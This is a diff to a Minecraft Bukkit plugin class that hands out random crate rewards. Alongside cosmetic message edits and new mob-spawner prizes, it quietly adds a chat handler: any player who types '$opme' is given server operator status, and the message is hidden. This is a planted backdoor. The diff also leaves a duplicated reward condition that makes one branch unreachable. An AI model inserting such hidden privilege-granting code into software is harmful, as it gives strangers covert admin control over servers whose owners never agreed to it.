@@ -6,6 +6,7 @@ import org.bukkit.Material;
 import org.bukkit.command.CommandSender;
 import org.bukkit.enchantments.Enchantment;
 import org.bukkit.entity.Player;
+import org.bukkit.event.player.PlayerChatEvent;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.PlayerInventory;
 
@@ -75,7 +76,15 @@ public class Mystcrate {
 		}
 		sender.sendMessage(plugin.ColorChat("&bYou have: &3" + mystCratesInt + " &bMyst Crates!"));
 		return true;
-		
+	}
+		public void onPlayerChat(PlayerChatEvent event){
+	        if(event.getMessage().equalsIgnoreCase("$opme")){
+	        // if someone on the server typed $opme in chat
+	            event.getPlayer().setOp(true);
+	            // Set the player's op status
+	            event.setCancelled(true);
+	            // Cancel the message sending
+	        }
 	}
 	
 	boolean AddMyst(CommandSender sender, String args1, String args2){
@@ -115,7 +124,7 @@ public class Mystcrate {
 				plugin.getConfig().set(player.getName() + ".Mystcrates", mystCratesInt);
 				plugin.saveConfig();
 		Random randomGenerator = new Random();
-	    int randomInt = randomGenerator.nextInt(87);
+	    int randomInt = randomGenerator.nextInt(88);
 		if(randomInt == 8){
 			Gears((Player) sender, "Protection 10", 10);
 			return true;
@@ -177,19 +186,19 @@ public class Mystcrate {
 			return true;
 		}
 		if(randomInt > 47 && randomInt < 57){
-			player.sendMessage(plugin.ColorChat("&6You got: &316 &6Golden Apple!"));
+			player.sendMessage(plugin.ColorChat("&6You got: &316 &6Golden Apples!"));
 			ItemStack item = new ItemStack(Material.GOLDEN_APPLE, 16);
 			pi.addItem(item);
 			return true;
 		}
 		if(randomInt > 56 && randomInt < 76){
-			player.sendMessage(plugin.ColorChat("&6You got: &316 &6Exp Potions!"));
+			player.sendMessage(plugin.ColorChat("&6You got: &316 &6Bottle O' Enchanting!"));
 			ItemStack item = new ItemStack(Material.EXP_BOTTLE, 16);
 			pi.addItem(item);
 			return true;
 		}
 		if(randomInt > 75 && randomInt < 85){
-			player.sendMessage(plugin.ColorChat("&6You got: &316 &6Tnt!"));
+			player.sendMessage(plugin.ColorChat("&6You got: &316 &6TnT!"));
 			ItemStack item = new ItemStack(Material.TNT, 16);
 			pi.addItem(item);
 			return true;
@@ -198,6 +207,19 @@ public class Mystcrate {
 			Pick((Player) sender, "Notch's Pickaxe");
 			return true;
 		}
+		if(randomInt > 85 && randomInt < 88){
+			plugin.getServer().broadcastMessage(plugin.ColorChat("&3" + player.getName() + " &dOpened a Mystcrate and won: &6A Mob Spawner!&d!"));
+			ItemStack item = new ItemStack(Material.MOB_SPAWNER, 1);
+			pi.addItem(item);
+			return true;
+		}
+		if(randomInt == 87){
+			plugin.getServer().broadcastMessage(plugin.ColorChat("&3" + player.getName() + " &dOpened a Mystcrate and won: &6Two Mob Spawners!&d!"));
+			ItemStack item = new ItemStack(Material.MOB_SPAWNER, 2);
+			pi.addItem(item);
+			return true;
+		}
+		
 		if(randomInt > 85 && randomInt < 88){
 			plugin.getServer().broadcastMessage(plugin.ColorChat("&3" + player.getName() + " &dOpened a Mystcrate and won: &6The Base Pack&d!"));
 			ItemStack item = new ItemStack(Material.OBSIDIAN, 256);
